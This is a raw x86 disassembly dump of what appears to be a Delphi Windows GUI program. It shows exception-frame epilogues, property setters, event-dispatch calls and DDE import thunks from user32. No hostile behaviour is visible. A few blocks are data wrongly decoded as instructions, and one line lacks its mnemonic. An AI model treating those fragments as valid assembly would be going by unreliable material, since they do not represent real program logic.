pop ebp
retn
sub_46738c
jmp sub_4039f4
sub_467393
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4675be
jmp sub_4039f4
sub_4675c5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_467652
jmp sub_4039f4
sub_467659
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4676d8
mov ecx edx
mov [ eax + 0x78 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_41a1b4
sub_4678e9
jmp sub_4039f4
sub_467968
jmp sub_4039f4
sub_46796f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_467a3d
jmp sub_4039f4
sub_467a9a
jmp sub_4039f4
sub_467aa1
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467b28
jmp sub_4039f4
sub_467b2f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467c7a
jmp sub_4039f4
sub_467c81
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467ca0
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_467c99
jmp sub_4039f4
sub_467ca0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467cbd
lea eax [ ebp - 0x14 ]
call sub_404074
retn
sub_467cb6
jmp sub_4039f4
sub_467cbd
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_467d80
mov eax [ eax + 0xb0 ]
call sub_41658c
retn
sub_467d8c
push ebx
push 0x0
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_467e6a
jmp sub_4039f4
sub_467e71
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467f4d
jmp sub_4039f4
sub_467f54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4680a6
jmp sub_4039f4
sub_4680ad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4680d7
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404098
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_4680d0
jmp sub_4039f4
sub_4680d7
pop ebx
mov esp ebp
pop ebp
retn
sub_4680df
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x33 ] dl
ror [ ebx + 0x3453ff18 ] cl
pop ebx
retn
sub_4680f4
push ebx
mov ebx eax
mov eax ebx
call sub_41658c
xor eax eax
mov [ ebx + 0x24 ] eax
pop ebx
retn
sub_4681dc
jmp sub_4039f4
sub_4681e3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4681ec
mov edx [ eax + 0x4 ]
add edx [ eax + 0x24 ]
mov eax edx
retn
sub_4682e4
jmp sub_4039f4
sub_4682eb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46834d
jmp sub_4039f4
sub_468354
pop ebp
retn
sub_468358
sub [ rw-data ] 0x1
retn
sub_46868f
jmp sub_403740
sub_4686bc
jmp sub_4039f4
sub_4686c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468712
jmp sub_4039f4
sub_468719
pop ebx
pop ecx
pop ebp
retn
sub_468788
push ebx
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_4687a8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0xc8 ]
mov edx esi
call sub_4040c8
pop esi
pop ebx
retn
sub_4687c0
mov [ eax + 0xdc ] edx
retn
sub_4687ed
jmp sub_4039f4
sub_4687f4
pop ebp
retn
sub_4687f8
sub [ rw-data ] 0x1
retn
DdeInitializeA
jmp [ __import_lookup_table_13(user32:DdeInitializeA) ]
DdeUninitialize
jmp [ __import_lookup_table_13(user32:DdeUninitialize) ]
DdeConnect
jmp [ __import_lookup_table_13(user32:DdeConnect) ]
DdeDisconnect
jmp [ __import_lookup_table_13(user32:DdeDisconnect) ]
DdeQueryConvInfo
jmp [ __import_lookup_table_13(user32:DdeQueryConvInfo) ]
DdeSetUserHandle
jmp [ __import_lookup_table_13(user32:DdeSetUserHandle) ]
DdePostAdvise
jmp [ __import_lookup_table_13(user32:DdePostAdvise) ]
DdeNameService
jmp [ __import_lookup_table_13(user32:DdeNameService) ]
DdeClientTransaction
jmp [ __import_lookup_table_13(user32:DdeClientTransaction) ]
DdeCreateDataHandle
jmp [ __import_lookup_table_13(user32:DdeCreateDataHandle) ]
DdeAccessData
jmp [ DdeAccessData@IAT ]
DdeUnaccessData
jmp [ DdeUnaccessData@IAT ]
DdeFreeDataHandle
jmp [ DdeFreeDataHandle@IAT ]
DdeGetLastError
jmp [ DdeGetLastError@IAT ]
DdeQueryStringA
jmp [ DdeQueryStringA@IAT ]
DdeCmpStringHandles
jmp [ DdeCmpStringHandles@IAT ]
sub_4688b5
jmp sub_4039f4
sub_4688bc
pop ebp
retn
sub_4688c0
sub [ rw-data ] 0x1
retn
sub_4689e2
out dx al
jmp [ eax - 0x5b ]
sub_468b2c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
mov eax [ esi ]
int3
sub_469376
jmp sub_4039f4
sub_46937d
pop ebx
mov esp ebp
pop ebp
retn
sub_469648
jmp sub_4039f4
sub_46964f
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4697d0
jmp sub_4039f4
sub_4697d7
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469915
jmp sub_4039f4
sub_46991c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_469a0c
jmp sub_4039f4
sub_469a13
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469b22
jmp sub_4039f4
sub_469b29
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469bdb
jmp sub_4039f4
sub_469be2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469be8
push ebx
mov ecx [ eax + 0x40 ]
mov ebx [ ecx + 0x8 ]
mov eax ecx
mov ecx edx
mov edx ebx
call sub_413e60
pop ebx
retn
sub_469bfc
mov eax [ eax + 0x40 ]
call sub_413f80
retn
sub_469d46
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
sub_469d54
jmp sub_4039f4
j_sub_469d46
jmp sub_469d46
sub_469d5b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469e0b
jmp sub_4039f4
sub_469e12
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469edb
jmp sub_4039f4
sub_469ee2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a276
jmp sub_4039f4
sub_46a27d
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a42c
mov [ eax + 0xc6 ] 0x0
retn
sub_46a510
cmp dl [ eax + 0xc7 ]
je r-xdata
retn
mov [ eax + 0xc7 ] dl
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
call sub_46a478
sub_46a530
retn
sub_46a534
retn
sub_46a538
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_4040c8
pop esi
pop ebx
retn
sub_46a54c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_4040c8
pop esi
pop ebx
retn
sub_46a560
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_46a580
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_46a703
jmp sub_4039f4
sub_46a70a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a81c
retn
sub_46a820
retn
sub_46a931
jmp sub_4039f4
sub_46a938
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46aa0d
jmp sub_4039f4
sub_46aa14
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46aa84
push ecx
push edx
call DdeAccessData
retn
sub_46aa8c
push edx
call DdeUnaccessData
retn
sub_46abac
mov eax [ eax + 0x10 ]
call sub_46a7a8
retn
sub_46ac34
mov [ eax + 0x34 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41a1b4
sub_46ad10
jmp sub_4039f4
sub_46ad17
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46ada7
jmp sub_4039f4
sub_46adae
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ae37
jmp sub_4039f4
sub_46ae3e
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ae48
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_46af87
jmp sub_4039f4
sub_46af8e
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46af98
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_46afac
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_46b1a8
jmp sub_4039f4
sub_46b1af
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46b28f
jmp sub_4039f4
sub_46b296
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46b3c1
jmp sub_4039f4
sub_46b3c8
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46b679
jmp sub_4039f4
sub_46b680
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b68c
mov edx [ eax + 0x38 ]
push edx
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdePostAdvise
retn
sub_46b735
jmp sub_4039f4
sub_46b73c
pop ebp
retn
sub_46c451
jmp sub_4039f4
sub_46c458
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c750
mov [ edx + 0xc ] 0x81
retn
sub_46c7a2
jmp sub_4039f4
sub_46c7a9
pop ebx
pop ecx
pop ebp
retn
sub_46c7b0
push ebx
mov ebx eax
mov eax ebx
call sub_443c10
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_46cc64
push ebx
mov ebx eax
mov eax ebx
call sub_43da04
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_46ccad
jmp sub_4039f4
sub_46ccb4
pop ebp
retn
sub_46ccb8
sub [ rw-data ] 0x1
retn
sub_46d0ca
jmp sub_4039f4
sub_46d0d1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46d249
jmp sub_4039f4
sub_46d250
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46d29d
jmp sub_4039f4
sub_46d2a4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d4b5
jmp sub_4039f4
sub_46d4bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46d68e
jmp sub_4039f4
sub_46d695
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46d6c5
jmp sub_4039f4
sub_46d6cc
pop ebp
retn
sub_46d6d0
sub [ rw-data ] 0x1
retn
sub_46dad8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f494
movsx eax [ esi + 0x8 ]
mov [ ebx + 0x234 ] eax
pop esi
pop ebx
retn
sub_46db54
push ebx
mov ebx eax
mov eax ebx
call sub_442d2c
mov eax ebx
call sub_46def4
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46e384
sub_46dbd0
jmp sub_4039f4
sub_46dbd7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46dc30
jmp sub_4039f4
sub_46dc37
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46dcc4
jmp sub_4039f4
sub_46dccb
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46ddca
jmp sub_4039f4
sub_46ddd1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46dee6
jmp sub_4039f4
sub_46deed
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46def4
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
setne al
pop ebx
retn
sub_46dfb9
jmp sub_4039f4
sub_46dfc0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e094
mov eax [ eax + 0x208 ]
retn
sub_46e2e2
jmp sub_4039f4
sub_46e374
jmp sub_4039f4
sub_46e37b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e3c4
xor edx edx
call sub_46dcd4
retn
sub_46e3cc
mov al 0x1
retn
sub_46e5bd
jmp sub_4039f4
sub_46e5c4
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e7aa
jmp sub_4039f4
sub_46e7b1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e7f0
push ebx
mov ebx eax
mov eax edx
dec eax
mov edx eax
mov eax ebx
call sub_46e834
mov edx eax
mov eax ebx
call sub_46e114
pop ebx
retn
sub_46ea44
jmp sub_4039f4
sub_46ea4b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ead7
jmp sub_4039f4
sub_46eade
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46eb65
jmp sub_4039f4
sub_46eb6c
pop ebx
mov esp ebp
pop ebp
retn
sub_46ec72
jmp sub_4039f4
sub_46ec79
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46eeca
jmp sub_4039f4
sub_46eed1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ef74
mov edx [ rw-data ]
cmp [ edx + 0x4 ] 0x11
jne r-xdata
xor eax eax
retn
add al 0x5f
sub al 0x3f
jb r-xdata
mov al 0x1
retn
sub_46f05a
jmp sub_4039f4
sub_46f061
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46f31e
jmp sub_4039f4
sub_46f325
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46f738
jmp sub_4039f4
sub_46f73f
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46f7cd
jmp sub_4039f4
sub_46f7d4
pop ebp
retn
sub_46f7d8
sub [ rw-data ] 0x1
retn
sub_470ee4
cmp eax [ ecx ]
jl r-xdata
xor eax eax
retn
cmp eax [ ecx + 0x8 ]
jg r-xdata
cmp edx [ ecx + 0x4 ]
jl r-xdata
cmp edx [ ecx + 0xc ]
jle r-xdata
mov al 0x1
retn
sub_47124f
jmp sub_4039f4
sub_471256
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_471370
push ebx
mov ebx edx
mov edx ebx
call sub_4321a8
or [ ebx + 0x4 ] 0x4
pop ebx
retn
sub_471380
mov [ eax + 0x240 ] edx
retn
sub_471388
retn
sub_471414
push esi
mov eax [ eax + 0x240 ]
mov si 0xffe9
call sub_40349c
pop esi
retn
sub_47145c
push esi
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_40349c
pop esi
retn
sub_471934
push esi
push ecx
mov [ esp ] cl
mov cl [ esp ]
mov eax [ eax + 0x240 ]
mov si 0xffbb
call sub_40349c
pop edx
pop esi
retn
sub_4719c8
push ebx
mov ebx eax
push 0xffffffff
push 0x7fffffff
push 0xb1
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_471bdc
xor ecx ecx
call sub_471ad4
retn
sub_471be4
mov cl 0x1
call sub_471ad4
retn
sub_471c98
jmp sub_4039f4
sub_471c9f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_471f58
jmp sub_4039f4
sub_471f5f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_472104
push ebx
mov ebx eax
mov eax ebx
call sub_442f34
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_472230
sub_472144
mov al 0x1
retn
sub_472148
mov al 0x1
retn
sub_47214c
mov al [ eax + 0x219 ]
retn
sub_472200
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_404074
pop ebp
retn 0x4
sub_472210
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_404074
pop ebp
retn 0x4
sub_472220
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_472228
xor eax eax
retn
sub_47222c
xor eax eax
retn
sub_472230
mov [ eax + 0x28d ] 0x0
call sub_4768d4
retn
sub_472240
mov [ eax + 0x28d ] 0x1
call sub_4769b0
retn
sub_472288
mov [ eax + 0x280 ] 0xffffffff
mov [ eax + 0x284 ] 0xffffffff
call sub_4769b0
retn
sub_4725a4
retn
sub_47262c
retn
sub_472630
mov al 0x1
retn
sub_472634
retn
sub_4726d0
xchg ecx edx
push edi
mov edi eax
mov eax edx
[ edi ]
pop edi
retn
j_sub_403740#2
jmp sub_403740
sub_473e19
jmp sub_4039f4
sub_473e20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473e3d
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
sub_473e36
jmp sub_4039f4
sub_473e3d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_473fa8
jmp sub_4039f4
sub_473faf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473fcc
mov eax [ ebp - 0x8 ]
call sub_4032a0
retn
sub_473fc5
jmp sub_4039f4
sub_473fcc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4742ac
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_474ac1
jmp sub_4039f4
sub_474ac8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_474b28
push ebp
mov ebp esp
call sub_4742ac
pop ebp
retn 0x4
sub_474b34
push ebp
mov ebp esp
call sub_4742ac
pop ebp
retn 0x4
sub_4753ca
jmp sub_4039f4
sub_475404
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_471310
retn
j_sub_403740
jmp sub_403740
sub_475d98
cmp [ ebp - 0x11 ] 0x0
je r-xdata
call sub_403aa8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_473e44
sub_4761fb
jmp sub_4039f4
sub_476202
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_476384
mov ecx [ eax + 0x220 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x230 ]
retn
cmp edx [ eax + 0x21c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_4763a4
mov ecx [ eax + 0x250 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x234 ]
retn
cmp edx [ eax + 0x24c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_4763c4
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
lea edx [ ebx + 0x210 ]
lea eax [ ebx + 0x228 ]
call sub_470e7c
pop esi
pop ebx
retn
sub_4763e0
mov ecx [ eax + 0x224 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
mov al 0x1
retn
sub_4763f4
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_473310
mov eax [ esp + 0x10 ]
sub eax [ ebx + 0x258 ]
inc eax
add esp 0x60
pop ebx
retn
sub_476414
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_473310
mov eax [ esp + 0x40 ]
sub eax [ ebx + 0x25c ]
inc eax
add esp 0x60
pop ebx
retn
sub_476434
cmp dl [ eax + 0x218 ]
je r-xdata
retn
mov [ eax + 0x218 ] dl
call sub_441b98
sub_476542
jmp sub_4039f4
sub_476549
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4765c8
cmp edx [ eax + 0x240 ]
je r-xdata
retn
mov [ eax + 0x240 ] edx
call sub_4742ac
sub_476664
jmp sub_4039f4
sub_47666b
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4766fc
jmp sub_4039f4
sub_476703
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_476734
cmp edx [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] edx
call sub_4742ac
sub_4767c0
cmp edx [ eax + 0x22c ]
je r-xdata
retn
push 0x1
mov ecx edx
mov edx [ eax + 0x228 ]
call sub_473fd4
sub_4768b2
jmp sub_4039f4
sub_4768b9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4768c0
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
call sub_441b98
sub_476933
jmp sub_4039f4
sub_476af6
jmp sub_4039f4
sub_476afd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_476b60
mov [ edx + 0xc ] 0x1
test [ eax + 0x249 ] 0x10
jne r-xdata
retn
test [ eax + 0x249 ] 0x8
je r-xdata
test [ eax + 0x249 ] 0x4
je r-xdata
or [ edx + 0xc ] 0x2
or [ edx + 0xc ] 0x80
sub_476bdc
push ebx
mov ebx eax
mov eax ebx
call sub_43f494
cmp [ ebx + 0x27c ] 0x0
je r-xdata
pop ebx
retn
call GetMessageTime
mov edx [ ebx + 0x27c ]
mov [ edx + 0x244 ] eax
sub_476d6c
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
mov edx 0x1
call sub_4746d8
retn
sub_476d84
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
xor edx edx
call sub_4746d8
retn
sub_476e21
jmp sub_4039f4
sub_476e28
mov esp ebp
pop ebp
retn
sub_476e2c
push ebx
mov ebx eax
mov eax ebx
call sub_43f8b8
mov eax ebx
call sub_476d98
pop ebx
retn
sub_476e90
push ebx
mov ebx eax
mov eax ebx
call sub_443c10
mov eax ebx
call sub_441b98
pop ebx
retn
sub_477108
push ebx
mov ebx eax
mov eax ebx
call sub_4752bc
mov eax ebx
call sub_4769b0
pop ebx
retn
sub_47711c
push ebx
mov ebx eax
mov ecx [ ebx + 0x21c ]
dec ecx
mov eax ebx
call sub_4724d0
mov edx [ ebx + 0x21c ]
dec edx
mov eax ebx
call sub_476448
pop ebx
retn
sub_477140
push ebx
mov ebx eax
mov ecx [ ebx + 0x24c ]
dec ecx
mov eax ebx
call sub_4725a8
mov edx [ ebx + 0x24c ]
dec edx
mov eax ebx
call sub_4767d8
pop ebx
retn
sub_477234
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_477240
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_47724c
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_477258
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_477264
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_477270
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_47727c
push ebx
mov ebx eax
mov eax ebx
call sub_443abc
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4752bc
sub_477298
push ebx
cmp [ eax + 0x29a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
sub_477338
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_477454
push ebx
mov ebx eax
mov eax ebx
call sub_472690
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_4774c4
mov edx [ r-xdata ]
call sub_404e30
retn
sub_477a90
retn
sub_477aef
jmp sub_4039f4
sub_477af6
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_477b94
jmp sub_4039f4
sub_477b9b
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_477c60
jmp sub_4039f4
sub_477c67
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_477d5f
jmp sub_4039f4
sub_477d66
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_477d70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
xor eax eax
pop ebp
retn
sub_477de4
push ebx
push eax
push sub_477cf4
push eax
push sub_477da8
mov cl 0x1
mov eax edx
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
retn
sub_477e44
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
retn
sub_477f14
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_477f58
mov eax [ eax + 0x10 ]
call sub_477a4c
retn
sub_477f90
mov eax edx
call sub_4774c4
xor eax eax
retn
sub_477f9c
push ebx
mov ebx eax
mov edx sub_477f90
mov eax [ ebx + 0x10 ]
call sub_477a88
mov eax [ ebx + 0x10 ]
call sub_4779e0
mov eax ebx
call sub_477f14
pop ebx
retn
sub_4780c9
jmp sub_4039f4
sub_4780f0
jmp sub_4039f4
sub_4780f7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4781ca
jmp sub_4039f4
sub_4781d1
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4782c6
jmp sub_4039f4
sub_4782cd
pop ecx
pop ebp
retn
sub_4783a7
jmp sub_4039f4
sub_4783ae
pop ebx
pop ecx
pop ebp
retn
sub_478414
mov eax [ eax + 0x10 ]
call sub_4787b8
retn
sub_478648
jmp sub_4039f4
sub_478677
jmp sub_4039f4
sub_47867e
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_478714
jmp sub_4039f4
sub_47871b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_478724
inc [ eax + 0x2e8 ]
retn
sub_47872c
dec [ eax + 0x2e8 ]
retn
sub_4787b8
push ebx
mov ebx eax
mov [ ebx + 0x2e4 ] dl
test dl dl
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x2e5 ] 0x0
je r-xdata
mov eax ebx
call sub_4742ac
mov [ ebx + 0x2e5 ] 0x0
sub_478a19
jmp sub_4039f4
sub_478a20
pop ebp
retn
sub_478a24
sub [ rw-data ] 0x1
retn
sub_478ec0
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_478ed4
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_478ee8
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_478efc
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_478fca
jmp sub_4039f4
sub_478fd8
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_478fec
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_479000
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_479014
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_479030
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_4790a0
push ebx
